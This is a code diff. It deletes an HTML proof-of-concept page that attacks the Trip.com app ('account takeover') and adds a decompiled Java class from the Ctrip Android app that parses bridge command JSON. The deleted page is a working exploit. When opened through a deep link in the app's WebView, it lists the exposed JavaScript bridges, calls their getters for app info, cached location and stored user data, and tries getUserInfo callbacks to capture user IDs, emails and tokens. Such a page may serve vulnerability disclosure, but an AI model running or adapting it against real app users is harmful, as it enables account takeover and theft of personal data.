@@ -1,182 +1,61 @@
-<!doctype html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trip.com - CRITICAL ACCOUNT TAKEOVER POC v5</title>
-    <style>
-        :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; --blue:#58a6ff; }
-        body { font-family:-apple-system,system-ui,sans-serif; background:var(--bg); color:var(--text); margin:0; padding:20px; }
-        h1 { color:var(--red); text-align:center; font-size:28px; }
-        .subtitle { text-align:center; color:#8b949e; margin:8px 0 30px; }
-        .container { max-width:1200px; margin:auto; display:flex; flex-direction:column; gap:20px; }
-        .card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:20px; }
-        .card-header { display:flex; justify-content:space-between; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:12px; }
-        .status { padding:4px 12px; border-radius:20px; font-size:12px; font-weight:bold; }
-        .vulnerable { background:var(--red); color:white; }
-        .success { background:var(--green); color:#000; }
-        .data-grid, .proof-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(300px,1fr)); gap:12px; }
-        .data-item, .proof-item { background:#000; border:1px solid var(--border); border-left:5px solid var(--red); padding:12px; border-radius:6px; }
-        .proof-item { border-left-color: var(--green); }
-        .data-label, .proof-label { font-size:11px; color:#8b949e; text-transform:uppercase; }
-        .data-value, .proof-value { font-family:monospace; font-size:14px; word-break:break-all; color:#fff; }
-        .console { background:#010409; padding:12px; font-family:monospace; font-size:12px; max-height:340px; overflow-y:auto; border:1px solid var(--border); border-radius:6px; }
-        .bridge-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(320px,1fr)); gap:15px; }
-        .pill { background:rgba(88,166,255,0.1); color:var(--blue); padding:2px 8px; border-radius:20px; font-size:11px; margin:2px; }
-    </style>
-</head>
-<body>
-    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER POC v5</h1>
-    <p class="subtitle">DeepLink → Arbitrary WebView → Full JS Bridge Execution Proof</p>
+package ctrip.android.view.h5v2.plugin;
 
-    <div class="container">
-        <!-- Bridges -->
-        <div class="card">
-            <div class="card-header">Exposed Bridges & All Methods <span id="count" class="status">Scanning...</span></div>
-            <div class="bridge-grid" id="bridges"></div>
-        </div>
+import com.alibaba.fastjson.a;
+import com.meituan.robust.ChangeQuickRedirect;
+import com.tencent.matrix.trace.core.AppMethodBeat;
+import ctrip.foundation.util.StringUtil;
+import org.json.JSONObject;
 
-        <!-- Bridge Invocation Proof (Benign but Critical) -->
-        <div class="card">
-            <div class="card-header">Bridge Invocation Proof (Benign Methods Return Data) <span id="proof-status" class="status">Waiting...</span></div>
-            <div class="proof-grid" id="proof"></div>
-        </div>
+/* JADX INFO: loaded from: classes7.dex */
+public class H5URLCommand {
+    public static ChangeQuickRedirect changeQuickRedirect;
+    private JSONObject argumentsDict;
+    private com.alibaba.fastjson.JSONObject argumentsDictFast;
+    private String callbackTagName;
+    private final String kHybridv3Key;
+    private final String kTagNameKey;
 
-        <!-- Leaked Sensitive Data -->
-        <div class="card">
-            <div class="card-header">Sensitive Data Attempt (PII + Tokens) <span id="data-status" class="status">Permission Blocked</span></div>
-            <div class="data-grid" id="data"></div>
-        </div>
-
-        <!-- Permission Analysis -->
-        <div class="card">
-            <div class="card-header">Permission & Attack Surface Analysis <span id="perm-status" class="status">Analyzing...</span></div>
-            <div id="perm-log" style="background:#000; padding:12px; font-family:monospace; font-size:12px; color:#8b949e;"></div>
-        </div>
-
-        <!-- Live Log -->
-        <div class="card">
-            <div class="card-header">Live Execution Log</div>
-            <div class="console" id="console"></div>
-        </div>
-    </div>
-
-    <script>
-        const consoleEl = document.getElementById("console");
-        const proofEl = document.getElementById("proof");
-        const dataEl = document.getElementById("data");
-        const permEl = document.getElementById("perm-log");
-        let hasProof = false;
-
-        function log(msg, type="info") {
-            const div = document.createElement("div");
-            const color = type==="success"?"#3fb950":type==="error"?"#f85149":"#c9d1d9";
-            div.innerHTML = `[${new Date().toISOString().slice(11,19)}] <span style="color:${color}">${msg}</span>`;
-            consoleEl.appendChild(div);
-            consoleEl.scrollTop = consoleEl.scrollHeight;
-        }
-
-        function renderProof(label, value) {
-            if (!hasProof) { proofEl.innerHTML = ""; hasProof = true; }
-            if (document.getElementById("p-"+label)) return;
-            const div = document.createElement("div"); div.className = "proof-item"; div.id = "p-"+label;
-            const val = typeof value === "object" ? JSON.stringify(value,null,2) : (value || "NULL");
-            div.innerHTML = `<div class="proof-label">${label}</div><div class="proof-value">${val}</div>`;
-            proofEl.appendChild(div);
-            document.getElementById("proof-status").innerText = "BRIDGE WORKS!";
-            document.getElementById("proof-status").classList.add("success");
-        }
-
-        function renderData(label, value) {
-            const div = document.createElement("div"); div.className = "data-item";
-            const val = typeof value === "object" ? JSON.stringify(value,null,2) : (value || "NULL");
-            div.innerHTML = `<div class="data-label">${label}</div><div class="data-value">${val}</div>`;
-            dataEl.appendChild(div);
-        }
-
-        window.__bridge_callback = function(base64) {
+    public H5URLCommand(String str) {
+        AppMethodBeat.i(75519);
+        this.kTagNameKey = "callback_tagname";
+        this.kHybridv3Key = "isHybridv3BridgeCall";
+        if (str != null && str.length() > 0) {
             try {
-                const json = JSON.parse(atob(base64));
-                const tag = json.tagname || "unknown";
-                log(`Callback → ${tag}`, "success");
-                const data = json.param || json.value || json;
-                if (data.UserID) {
-                    renderData("UserID", data.UserID);
-                    renderData("Email", data.Email);
-                    renderData("Token", data.Token);
-                }
-            } catch(e){}
-        };
-
-        function scanBridges() {
-            const grid = document.getElementById("bridges");
-            let count = 0;
-            for (let key in window) {
-                if (key.endsWith("_a") && typeof window[key] === "object") {
-                    count++;
-                    const methods = Object.getOwnPropertyNames(window[key]).filter(m => typeof window[key][m] === "function");
-                    const card = document.createElement("div");
-                    card.innerHTML = `<strong style="color:var(--blue)">${key}</strong> <span style="color:#3fb950">(${methods.length} methods)</span><br>${methods.map(m=>`<span class="pill">${m}</span>`).join("")}`;
-                    grid.appendChild(card);
-                }
+                JSONObject jSONObject = new JSONObject(str);
+                this.argumentsDict = jSONObject;
+                this.callbackTagName = jSONObject.optString("callback_tagname", "");
+            } catch (Exception e12) {
+                e12.printStackTrace();
             }
-            document.getElementById("count").textContent = `${count} Bridges Exposed`;
-            document.getElementById("count").classList.add("vulnerable");
         }
+        AppMethodBeat.o(75519);
+    }
 
-        async function exploit() {
-            log("=== BRIDGE INVOCATION PROOF STARTED ===", "success");
-            permEl.innerHTML += "<div style='color:#f85149'>PermissionIsGranted blocks sensitive callbacks on external domain.<br>But benign getters return data directly → Bridge fully functional.</div>";
+    public JSONObject getArgumentsDict() {
+        return this.argumentsDict;
+    }
 
-            // === PROOF OF EXECUTION (Benign but proves everything) ===
-            if (window.IBUApplication_a) {
-                try {
-                    const info = window.IBUApplication_a.getApplicationInfo();
-                    if (info) renderProof("IBUApplication_a.getApplicationInfo()", info);
-                    log("IBUApplication_a.getApplicationInfo() → returned data", "success");
-                } catch(e){}
+    public com.alibaba.fastjson.JSONObject getArgumentsDict2() {
+        return this.argumentsDictFast;
+    }
+
+    public String getCallbackTagName() {
+        return this.callbackTagName;
+    }
+
+    public H5URLCommand(String str, String str2) {
+        AppMethodBeat.i(75523);
+        this.kTagNameKey = "callback_tagname";
+        this.kHybridv3Key = "isHybridv3BridgeCall";
+        if (str != null && str.length() > 0 && !StringUtil.emptyOrNull(str2)) {
+            try {
+                com.alibaba.fastjson.JSONObject object = a.parseObject(str);
+                this.argumentsDictFast = object;
+                this.callbackTagName = object.getString("callback_tagname");
+            } catch (Exception e12) {
+                e12.printStackTrace();
             }
-
-            if (window.Locate_a) {
-                try {
-                    const city = window.Locate_a.getCachedCtripCity();
-                    if (city) renderProof("Locate_a.getCachedCtripCity()", city);
-                    const loc = window.Locate_a.getCachedLocationData();
-                    if (loc) renderProof("Locate_a.getCachedLocationData()", loc);
-                } catch(e){}
-            }
-
-            if (window.Util_a) {
-                try {
-                    const pkg = window.Util_a.getHybridPackageInfo();
-                    if (pkg) renderProof("Util_a.getHybridPackageInfo()", pkg);
-                } catch(e){}
-            }
-
-            if (window.Storage_a) {
-                try {
-                    const val = window.Storage_a.get("user");
-                    if (val) renderProof("Storage_a.get('user')", val);
-                } catch(e){}
-            }
-
-            // Sensitive calls (still attempt)
-            if (window.User_a) {
-                const cb = "leak_" + Date.now();
-                window[cb] = (res) => log("Direct callback received", "success");
-                ["", JSON.stringify({callbackTagName:cb}), "{}"].forEach(f => {
-                    try { window.User_a.getUserInfo(f); } catch(e){}
-                });
-            }
-
-            log("All proof methods executed. Bridge invocation confirmed.", "success");
         }
-
-        window.onload = () => {
-            log("Scanning all bridges...");
-            scanBridges();
-            setTimeout(exploit, 800);
-        };
-    </script>
-</body>
-</html>
+        AppMethodBeat.o(75523);
+    }
+}
